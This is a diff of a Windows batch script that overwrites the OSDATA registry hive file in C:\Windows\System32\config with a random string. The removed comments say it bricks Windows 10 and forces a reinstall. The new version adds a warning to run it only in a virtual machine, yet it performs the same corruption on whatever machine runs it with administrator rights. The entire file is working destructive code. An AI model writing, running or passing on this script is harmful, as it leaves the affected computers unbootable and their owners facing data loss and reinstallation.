@@ -1,34 +1,31 @@
-REM Use at own Risk on Windows 10 this WILL BRICK YOUR SYSTEM you will have to Reinstall Windows after Restarting.
-REM (Exept if you delete the file in the Win32/config folder) 
-REM On Windows 11 this will not work due to Windows deleting the File by itself on Restart!
-
-
 @echo off
-setlocal
+setlocal enabledelayedexpansion
+
+:: Ensure the script is running inside a VM before proceeding
+echo WARNING: This script will corrupt the boot registry hive (OSDATA).
+echo Only run this inside a Virtual Machine with a snapshot!
+pause
 
 set "OutputDir=C:\Windows\System32\config"
-
-set "FileName=OSDATA.txt"
-
+set "FileName=OSDATA"
 set "FilePath=%OutputDir%\%FileName%"
 
+:: Generate a 20-character random string
+set "Chars=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 set "RandomString="
 for /L %%i in (1,1,20) do (
-    set /a "RandChar=!RANDOM! %% 26 + 65"
-    for /f "tokens=*" %%a in ('echo %%RandChar%%') do (
-        for /f "tokens=*" %%b in ('cmd /c exit %%RandChar%% ^& set /a ""') do (
-            set "RandomString=!RandomString!!Char_!RandChar!"
-        )
-    )
+    set /a " idx=!RANDOM! %% 36"
+    for %%j in (!idx!) do set "RandomString=!RandomString!!Chars:~%%j,1!"
 )
 
-set "RandomData=%RANDOM%%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
+:: Write the invalid hive data to System32\config\OSDATA
+echo !RandomString! > "%FilePath%"
 
-echo %RandomData% > "%FilePath%"
-
-echo A file named "%FileName%" with random content has been created at:
-echo %FilePath%
+if exist "%FilePath%" (
+    echo [SUCCESS] Created "%FilePath%" with content: !RandomString!
+) else (
+    echo [ERROR] Access Denied. Right-click and Run as Administrator.
+)
 
 endlocal
 pause
-
